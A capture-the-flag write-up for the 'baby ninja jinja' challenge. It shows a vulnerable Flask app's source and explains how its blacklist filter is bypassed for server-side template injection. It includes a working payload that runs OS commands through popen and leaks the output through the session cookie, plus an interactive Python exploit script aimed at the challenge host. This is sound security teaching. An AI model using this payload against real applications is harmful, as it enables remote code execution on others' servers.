# baby ninja jinja
![Screenshot from 2021-08-19 20-05-55](https://user-images.githubusercontent.com/87865134/130073504-107bfaac-b01f-42ea-a657-d8cc051ac7cb.png)

## Information gathering
- found `/debug` path and have source code:
```python
from flask import Flask, session, render_template, request, Response, render_template_string, g
import functools, sqlite3, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(120)

acc_tmpl = '''{% extends 'index.html' %}
{% block content %}
<h3>baby_ninja joined, total number of rebels: reb_num<br>
{% endblock %}
'''

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect('/tmp/ninjas.db')
        db.isolation_level = None
        db.row_factory = sqlite3.Row
        db.text_factory = (lambda s: s.replace('{{', '').
            replace("'", '&#x27;').
            replace('"', '&quot;').
            replace('<', '&lt;').
            replace('>', '&gt;')
        )
    return db

def query_db(query, args=(), one=False):
    with app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], str(value)) \
            for idx, value in enumerate(row)) for row in cur.fetchall()]
        return (rv[0] if rv else None) if one else rv

@app.before_first_request
def init_db():
    with app.open_resource('schema.sql', mode='r') as f:
        get_db().cursor().executescript(f.read())

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None: db.close()

def rite_of_passage(func):
    @functools.wraps(func)
    def born2pwn(*args, **kwargs):

        name = request.args.get('name', '')

        if name:
            query_db('INSERT INTO ninjas (name) VALUES ("%s")' % name)

            report = render_template_string(acc_tmpl.
                replace('baby_ninja', query_db('SELECT name FROM ninjas ORDER BY id DESC', one=True)['name']).
                replace('reb_num', query_db('SELECT COUNT(id) FROM ninjas', one=True).itervalues().next())
            )

            if session.get('leader'): 
                return report

            return render_template('welcome.jinja2')
        return func(*args, **kwargs)
    return born2pwn

@app.route('/')
@rite_of_passage
def index():
    return render_template('index.html')

@app.route('/debug')
def debug():
    return Response(open(__file__).read(), mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337, debug=True)
```

## Analysis
- website use `Flask` template
- value of parameter `?name=` to be saved into database and then select -> `render_template_string()` => maybe **Server-side Template Injection**
- website use blacklist to prevent vulnerability: `{{`, `'`, `"`, `<`, `>` => can't use `{}`. However, we can use `{% %}` to perform injection
- Result of code injection doesnt show in response. 
- In source we see `import session, request` 
  - can use `session` to show result of code injection
  - can use `request` to bypass `'` and `"` or use `chr()`
  
### How to attack:
  - injection code
  - check `session` in `cookie` of Http response
  - decode `session` to view result

## Exploit
- Injection code
  - blacklist: `{{`, `'`, `"`, `<`, `>`
  - payload:

```python     
{% if session.update({1:config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()})==1 %}{% endif %}&os=os&command=ls
```
- use `flask-usign` decode session 

![Screenshot from 2021-08-19 21-57-37](https://user-images.githubusercontent.com/87865134/130091714-74fddf9e-5cdf-4ef1-8c0a-7964581bd5c7.png)

- Python script
```python
import requests
import flask_unsign

url = 'http://142.93.35.92:31857'

while(1):
    cmd = input("command: ")
    if cmd == "q":
        exit()
    payload = "/?name={%+if+session.update({1:config.__class__.__init__.__globals__[request.args.os].popen(request.args.command).read()})+==+1+%}{%+endif+%}&os=os&command="+cmd
    res = requests.Session()
    res.get(url + payload)
    session_cookie = res.cookies.get_dict()['session']
    print(flask_unsign.decode(str(session_cookie))['1'].decode())
```
- run script and get flag

![Screenshot from 2021-08-19 21-52-50](https://user-images.githubusercontent.com/87865134/130090898-9fa2b7d0-aa39-4dca-90b7-0fa3c402d014.png)

## Description
- **category:** Server-side Template Injection

## Reference
- https://flask.palletsprojects.com/en/2.0.x/quickstart/#rendering-templates
